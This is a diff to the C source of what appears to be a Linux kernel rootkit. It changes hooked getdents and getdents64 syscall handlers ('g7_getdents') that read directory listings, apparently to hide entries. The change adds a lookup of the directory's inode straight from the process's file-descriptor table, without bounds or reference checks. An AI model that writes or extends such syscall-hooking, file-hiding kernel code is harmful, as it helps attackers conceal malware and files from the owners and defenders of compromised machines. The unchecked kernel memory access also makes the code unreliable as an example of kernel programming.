@@ -1,5 +1,8 @@
 #include <linux/kallsyms.h>
 #include <linux/slab.h>
+#include <linux/fs.h>
+#include <linux/fdtable.h>
+
 
 #include "hook.h"
 
@@ -51,8 +54,10 @@ g7_getdents(const struct pt_regs *pt_regs)
 
     unsigned long offset;
     dirent_t_ptr kdirent, cur_kdirent, prev_kdirent;
+    struct inode *kdirent_inode;
 
     cur_kdirent = prev_kdirent = NULL;
+    int fd = (int)pt_regs->di;
     dirent_t_ptr dirent = (dirent_t_ptr)pt_regs->si;
     long ret = sys_getdents(pt_regs);
 
@@ -61,6 +66,8 @@ g7_getdents(const struct pt_regs *pt_regs)
 
     if (copy_from_user(kdirent, dirent, ret))
         goto yield;
+
+    kdirent_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
 
     for (offset = 0; offset < ret;) {
         cur_kdirent = (dirent_t_ptr)((char *)kdirent + offset);
@@ -95,8 +102,10 @@ g7_getdents64(const struct pt_regs *pt_regs)
 
     unsigned long offset;
     dirent64_t_ptr kdirent, cur_kdirent, prev_kdirent;
+    struct inode *kdirent_inode;
 
     cur_kdirent = prev_kdirent = NULL;
+    int fd = (int)pt_regs->di;
     dirent64_t_ptr dirent = (dirent64_t_ptr)pt_regs->si;
     long ret = sys_getdents64(pt_regs);
 
@@ -105,6 +114,8 @@ g7_getdents64(const struct pt_regs *pt_regs)
 
     if (copy_from_user(kdirent, dirent, ret))
         goto yield;
+
+    kdirent_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
 
     for (offset = 0; offset < ret;) {
         cur_kdirent = (dirent64_t_ptr)((char *)kdirent + offset);
